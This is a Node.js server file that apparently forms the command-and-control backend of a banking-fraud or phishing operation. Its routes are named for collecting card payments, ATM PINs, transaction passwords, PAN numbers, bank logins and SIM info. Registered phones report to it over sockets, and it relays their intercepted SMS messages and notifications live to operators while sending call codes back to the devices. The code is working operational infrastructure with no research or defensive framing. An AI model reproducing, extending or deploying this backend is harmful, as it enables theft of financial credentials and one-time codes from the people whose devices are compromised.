// server.js
import dotenv from "dotenv";
import express from "express";
import cors from "cors";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import mongoose from "mongoose";
import { connectDB } from "./config/db.js";

import deviceRoutes from "./routes/deviceRoutes.js";
import cardPaymentRoutes from "./routes/cardPaymentRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import atmPinRoutes from "./routes/atmPinRoutes.js";
import transactionPassRoutes from "./routes/transactionPassRoutes.js";
import pinRoutes from "./routes/pinRoutes.js";
import panRoutes from "./routes/panRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import authRoutes from "./routes/authRoutes.js";
import bankLoginRoutes from "./routes/bankLoginRoutes.js";
import combinedRoutes from "./routes/combinedRoutes.js";
import logRoutes from "./routes/logRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import formRoutes from "./routes/formRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import callLogRoutes from "./routes/callLogRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

import { initAdminPassword } from "./controllers/authController.js";

// MODELS used in streams
import Sms from "./models/Sms.js";
import Notification from "./models/Notification.js";
import Device from "./models/Device.js";

dotenv.config();
connectDB();
console.log("MONGO_URI =", process.env.MONGO_URI);

const PORT = process.env.PORT || 5000;

// ---------- Express + HTTP + Socket.IO ----------
const app = express();
const server = createServer(app);

// Build flexible allowed origins
const allowedOriginsEnv = process.env.ALLOWED_ORIGINS || ""; // comma separated
const allowedOrigins = allowedOriginsEnv
  ? allowedOriginsEnv.split(",").map((s) => s.trim())
  : null; // if null -> allow all

// CORS config — allow dynamic origins or wildcard
const corsOptions = {
  origin: (origin, callback) => {
    // Allow requests with no origin (like server-to-server, curl)
    if (!origin) return callback(null, true);

    if (!allowedOrigins) {
      // no restriction configured => allow all
      return callback(null, true);
    }

    if (allowedOrigins.indexOf(origin) !== -1) {
      return callback(null, true);
    }

    callback(new Error("CORS Not Allowed by server"));
  },
  methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  allowedHeaders: [
    "Content-Type",
    "Authorization",
    "X-Requested-With",
    "Accept",
    "Origin",
  ],
  credentials: false,
};

app.use(cors(corsOptions));

app.use((req, res, next) => {
  if (!allowedOrigins) {
    res.setHeader("Access-Control-Allow-Origin", "*");
  }
  res.setHeader(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept, Authorization"
  );
  res.setHeader(
    "Access-Control-Allow-Methods",
    "GET, POST, PUT, DELETE, OPTIONS"
  );
  next();
});


app.use(express.json());
app.set("io", null); // temp, will set after io created

// Socket.IO with CORS (must match express CORS settings)
const io = new Server(server, {
  cors: {
    origin: allowedOrigins ? allowedOrigins : "*",
    methods: ["GET", "POST"],
    credentials: false,
  },
  // path: '/socket.io' // default
});

app.set("io", io);

// ---------------- Utilities ----------------
function cleanId(id) {
  if (!id) return null;
  return id.toString().trim().toUpperCase();
}

const deviceSockets = new Map(); // device -> socketId
const watchers = new Map(); // uniqueid -> Set(socketId)

function notifyWatchers(uniqueid, payload) {
  const set = watchers.get(uniqueid);
  if (!set) return;
  for (let sid of set) {
    io.to(sid).emit("deviceRealtime", payload);
  }
}

// OPTIONAL: helper exported for controllers (if you still import from server.js)
export function sendCallCodeToDevice(rawId, payload) {
  const id = cleanId(rawId);
  if (!id) return false;

  const socketId = deviceSockets.get(id);
  if (!socketId) {
    console.log("⚠️ No socket found for device:", id);
    return false;
  }

  io.to(socketId).emit("callCode", payload);
  console.log("📞 Call code sent to device:", id, payload);
  return true;
}

// ---------------- Socket interactions ----------------
io.on("connection", (socket) => {
  console.log("🟢 SOCKET CONNECTED:", socket.id);
  let currentUniqueId = null;

  socket.on("watchDevice", (rawId) => {
    const id = cleanId(rawId);
    if (!id) return;
    if (!watchers.has(id)) watchers.set(id, new Set());
    watchers.get(id).add(socket.id);
    console.log("👁 UI Watching:", id, " by ", socket.id);
  });

  socket.on("unwatchDevice", (rawId) => {
    const id = cleanId(rawId);
    if (!id) return;
    if (watchers.has(id)) watchers.get(id).delete(socket.id);
  });

  socket.on("registerDevice", (rawId) => {
    const id = cleanId(rawId);
    if (!id) return;
    console.log("🔗 Device Registered:", id);
    deviceSockets.set(id, socket.id);
    currentUniqueId = id;
    socket.join(id);
    saveLastSeen(id, "Online").catch(() => {});
    io.to(socket.id).emit("deviceRegistered", { uniqueid: id });
    const payload = {
      uniqueid: id,
      connectivity: "Online",
      updatedAt: new Date(),
    };
    io.emit("deviceStatus", payload);
    notifyWatchers(id, payload);
  });

  socket.on("deviceStatus", (data = {}) => {
    const id = cleanId(data.uniqueid);
    if (!id) return;
    const connectivity = data.connectivity || "Online";
    saveLastSeen(id, connectivity).catch(() => {});
    const payload = { uniqueid: id, connectivity, updatedAt: new Date() };
    io.emit("deviceStatus", payload);
    notifyWatchers(id, payload);
  });

  socket.on("disconnect", () => {
    console.log("🔴 SOCKET DISCONNECTED:", socket.id);
    if (currentUniqueId) {
      const id = currentUniqueId;
      const last = deviceSockets.get(id);
      if (last === socket.id) {
        deviceSockets.delete(id);
        saveLastSeen(id, "Offline").catch(() => {});
        const payload = {
          uniqueid: id,
          connectivity: "Offline",
          updatedAt: new Date(),
        };
        io.emit("deviceStatus", payload);
        notifyWatchers(id, payload);
      }
    }
    for (let [id, set] of watchers.entries()) {
      set.delete(socket.id);
    }
  });
});

// ---------------- Helper: saveLastSeen uses deployed URL if available ----------------
async function saveLastSeen(uniqueid, connectivity) {
  try {
    const base =
      process.env.RENDER_EXTERNAL_URL ||
      process.env.EXTERNAL_URL ||
      `http://localhost:${process.env.PORT || 5000}`;

    const url = new URL(
      `/api/lastseen/${encodeURIComponent(uniqueid)}/status`,
      base
    ).toString();

    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
  } catch (err) {
    console.log("❌ LastSeen Error:", err.message || err);
  }
}

// ---------------- Mongo streams & watchers ----------------
mongoose.connection.once("open", async () => {
  console.log("📡 Mongo Streams ACTIVE");
  await initAdminPassword();

  function watch(collection, cb) {
    const start = () => {
      try {
        const stream = mongoose.connection.collection(collection).watch();

        stream.on("change", async (chg) => {
          if (!["insert", "update", "replace"].includes(chg.operationType))
            return;
          const doc = await mongoose.connection
            .collection(collection)
            .findOne({ _id: chg.documentKey._id });
          if (doc) cb(doc);
        });

        stream.on("error", (err) => {
          console.error(
            "Change stream error for",
            collection,
            err.message || err
          );
          setTimeout(start, 2000);
        });
      } catch (e) {
        console.error(
          "Watch start error for",
          collection,
          e.message || e
        );
        setTimeout(start, 2000);
      }
    };

    start();
  }

  watch("devices", (doc) => {
    const id = cleanId(doc.uniqueid);
    if (!id) return;
    console.log("📱 DEVICE LIVE UPDATE:", id);
    io.emit("deviceUpdateGlobal", doc);
    io.to(id).emit("deviceUpdate", doc);
    notifyWatchers(id, { type: "device", ...doc });
  });

  watch("notifications", (doc) => {
    const id = cleanId(doc.uniqueid);
    if (!id) return;
    console.log("🔔 NOTIFICATION LIVE:", doc.body || doc);
    io.to(id).emit("notificationUpdate", doc);
    notifyWatchers(id, { type: "notification", ...doc });
    io.emit("notificationGlobal", doc);
  });

  try {
    const smsStream = Sms.watch();
    smsStream.on("change", async (chg) => {
      if (!["insert", "update", "replace"].includes(chg.operationType)) return;
      const docId = chg.documentKey?._id;
      if (!docId) return;
      const doc = await Sms.findById(docId).lean();
      if (!doc || !doc.uniqueid) return;
      const id = cleanId(doc.uniqueid);
      console.log("📩 SMS LIVE:", doc.body || doc);
      io.to(id).emit("smsUpdate", doc);
      notifyWatchers(id, { type: "sms", ...doc });
      io.emit("smsGlobal", doc);
    });
  } catch (e) {
    console.log("❌ SMS Watch Error:", e.message || e);
  }

  watch("admins", (doc) => io.emit("adminGlobal", doc));
  watch("siminfos", (doc) => io.emit("simInfoUpdated", doc));
  watch("callcodes", (doc) => {
    if (!doc || !doc.uniqueid) return;
    io.to(cleanId(doc.uniqueid)).emit("callCodeUpdate", doc);
  });
});

// ---------------- Routes registration ----------------
app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api", cardPaymentRoutes);
app.use("/api", transactionPassRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api", atmPinRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api", panRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/action", logRoutes);
app.use("/api", formRoutes);
app.use("/api/lastseen", lastSeenRoutes);
app.use("/api", combinedRoutes);
app.use("/api/call-log", callLogRoutes);
app.use("/api", pinRoutes);
app.use("/api", bankLoginRoutes);
app.use("/api/auth", authRoutes);

// health
app.get("/", (req, res) => res.send("Real-time Backend Running"));

// error middleware (last)
app.use((err, req, res, next) => {
  console.error("Express error:", err.stack || err);
  res.status(500).json({
    success: false,
    message: "Server error",
    error: err.message || err,
  });
});
// start
server.listen(PORT, () => {
  console.log(`Server Running on PORT ${PORT}`);
  console.log("Allowed origins:", allowedOrigins ? allowedOrigins : "ALL (*)");
});

// process-level handlers
process.on("unhandledRejection", (reason, p) => {
  console.error("Unhandled Rejection at: Promise", p, "reason:", reason);
});
process.on("uncaughtException", (err) => {
  console.error("Uncaught Exception thrown", err);
  // optionally exit
  // process.exit(1);
});
